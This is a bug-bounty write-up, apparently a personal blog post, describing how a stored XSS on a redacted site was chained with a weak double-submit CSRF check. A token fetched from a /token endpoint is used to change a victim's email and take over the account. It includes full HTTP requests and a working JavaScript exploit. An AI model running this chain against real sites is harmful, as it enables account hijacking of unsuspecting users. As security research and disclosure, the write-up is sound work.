---
layout: post
title: XSS to Account Takeover - Bypassing CSRF Header Protection and HTTPOnly Cookie
excerpt: "When doing a Bug Hunting and finding a Stored XSS bug, usually the imagination will get a big enough bounty has been spinning around on the head. But sometimes the imagination fades when we try to insert document.cookie into the XSS payload, and what appears is.."
tags: [bug hunting, hacking, csrf, xss, account takeover]
categories: [bug hunting]
comments: true
image:
  feature: 5d02f144bca472117661e342a29bf504-f.png
---

بسم الله الرحمن الرحيم


When doing a Bug Hunting and finding a Stored XSS bug, the imagination will usually get a big enough bounty that has been spinning around on the head. But sometimes the imagination fades when we try to insert `document.cookie` into the XSS payload and what appears is:

![Blank Cookie](/assets/5d02f144bca472117661e342a29bf504-1.png)

Popup alerts are expected to display cookies from the target website but instead display nothing because _the cookies on the website are set HTTPOnly so that they cannot be accessed by javascript_.

When you find something like this, usually, the next option is to make a request using **XHR** to `force` users to take sensitive actions without their knowledge. For example, changing passwords or changing email addresses.

And when will do that, requests are sent as follows:

```
POST /user/changeEmail HTTP/1.1
Host: redacted.com
Connection: close
Content-Length: 84
Sec-Fetch-Mode: cors
csrf-token: 3005c34f-4cea-4470-afe8-045f1c14a2af
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
Content-Type: application/json; charset=UTF-8
Accept: */*
Sec-Fetch-Site: same-origin
Accept-Encoding: gzip, deflate
Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,eu;q=0.6
Cookie: JSESSIONID=_zo6sV5qYkxhYwSCULJ4KRzOqP3G_-xVma2rKVPo; csrf-token=3005c34f-4cea-4470-afe8-045f1c14a2af;

{"email":"pwn@1337.com"}
```

In the request header, there is a `csrf` token aiming to prevent **CSRF** attacks. So the exploitation process becomes more difficult because there is a **CSRF** header that changes every time a request is made.

When viewed closely, the request header and cookie have `csrf-tokens` with the same value. So I tried to change the two values into another value, but still the same.

Request:

```
POST /user/changeEmail HTTP/1.1
Host: redacted.com
Connection: close
Content-Length: 84
Sec-Fetch-Mode: cors
csrf-token: asu
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
Content-Type: application/json; charset=UTF-8
Accept: */*
Sec-Fetch-Site: same-origin
Accept-Encoding: gzip, deflate
Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,eu;q=0.6
Cookie: JSESSIONID=_zo6sV5qYkxhYwSCULJ4KRzOqP3G_-xVma2rKVPo; csrf-token=asu;

{"email":"pwn@1337.com"}
```


Response:

```
{"changingEmailCompleted":true}
```


Boom! It turned out that the email was successfully changed using this method. This means we can manipulate the `csrf-token` in the header to anything as long as the value is the same as the `csrf-token` in the cookie.

Since we cannot access cookies, I have tried adding new cookies using the following script:

```html
<script>document.cookie="csrf-token=asu";</script>
```

When trying to make a request, the response is as follows:

![CSRF Detected](/assets/5d02f144bca472117661e342a29bf504-2.png)

Why does the `Possible CSRF attack detected` message appear?

When rechecking is done, the request turns out to be like this:

```
POST /user/changeEmail HTTP/1.1
Host: redacted.com
Connection: close
Content-Length: 84
Sec-Fetch-Mode: cors
csrf-token: asu
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
Content-Type: application/json; charset=UTF-8
Accept: */*
Sec-Fetch-Site: same-origin
Accept-Encoding: gzip, deflate
Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,eu;q=0.6
Cookie: csrf-token=asu; JSESSIONID=_zo6sV5qYkxhYwSCULJ4KRzOqP3G_-xVma2rKVPo; csrf-token=0b84028f-35de-4bd6-bf72-a0a776a7b3f2;

{"email":"pwn@1337.com"}
```


There appear two cookies named `csrf-token`. This seems to be the cause of the error earlier.


Since we don't do anything to the cookies, all we can use here is `csrf-token` in the request header. But of course, we must get a valid value.

This website is built using AngularJS, and there is no `csrf-token` value stored in the HTML code and the value of the `cookie` changes with every request.

Wait, `always changing every request?` This means that there are times when the server sends a new `cookie` to the browser. So I tried to find out when that moment happened.

Then a background request is found to the endpoint `/token` as follows:

Request:

```
POST /token HTTP/1.1
Host: redacted.com
Connection: close
Content-Length: 84
Sec-Fetch-Mode: cors
csrf-token: 0b84028f-35de-4bd6-bf72-a0a776a7b3f2
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
Content-Type: application/json; charset=UTF-8
Accept: */*
Sec-Fetch-Site: same-origin
Accept-Encoding: gzip, deflate
Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,eu;q=0.6
Cookie: JSESSIONID=_zo6sV5qYkxhYwSCULJ4KRzOqP3G_-xVma2rKVPo; csrf-token=0b84028f-35de-4bd6-bf72-a0a776a7b3f2;
```

Response:

```
HTTP/1.1 200 OK
Content-Type: application/json;charset=UTF-8
Connection: close
Date: Fri, 04 Oct 2019 15:08:38 GMT
Server: nginx
Expires: Thu, 01 Jan 1970 00:00:00 GMT
Cache-Control: no-cache, no-store, must-revalidate
Set-Cookie: csrf-token=725d97de-550d-4644-9579-d4b3e1209ded; path=/; secure; HttpOnly
X-XSS-Protection: 1; mode=block
Pragma: no-cache
csrf-token: 725d97de-550d-4644-9579-d4b3e1209ded
Content-Security-Policy: frame-ancestors 'self'
X-Content-Type-Options: nosniff
[...]
```

It can be seen that when making a request to endpoint `/token`, the server responds by giving a new `csrf-token` cookie. Then we can use this request to retrieve the `csrf-token`, using a script like the following:


```javascript
var xhr = new XMLHttpRequest();
var method = 'GET';
var url = 'https://redacted.com/token';
xhr.open(method,url,true);
xhr.send(null);

xhr.onreadystatechange = function()
{
 var token = xhr.getResponseHeader('csrf-token');
 alert(token);
}
```


And the **CSRF Token** was successfully obtained!


![CSRF Token](/assets/5d02f144bca472117661e342a29bf504-3.png)


Finally, combine it with the request to change the email earlier.

```javascript
var xhr = new XMLHttpRequest();
var method = 'GET';
var url = 'https://redacted.com/token';
xhr.open(method,url,true);
xhr.send(null);

xhr.onreadystatechange = function()
{
 var token = xhr.getResponseHeader('csrf-token'); // ngambil token dari response header

 xhr.open("POST","https://redacted.com/user/changeEmail", true);
 xhr.withCredentials="true";
 xhr.setRequestHeader("csrf-token", token);
 xhr.setRequestHeader("Content-type", "application/json; charset=UTF-8");
 xhr.send('{"email":"pwn@1337.com"}');
}
alert('Ups, You\'re pwned!');
```


And the email address was successfully changed.

![Pwn](/assets/5d02f144bca472117661e342a29bf504-4.png)


#### Conclusion

- When finding a Stored XSS but cannot get a cookie, don't report it immediately because it is likely that the severity will decrease.
- Try to do chaining with other bugs, CSRF for example to perform sensitive actions
- When finding CSRF Protection, try to delete it or change its value to null, sometimes something magical can work.
- Look for other endpoints that can be used to obtain a valid CSRF Token.
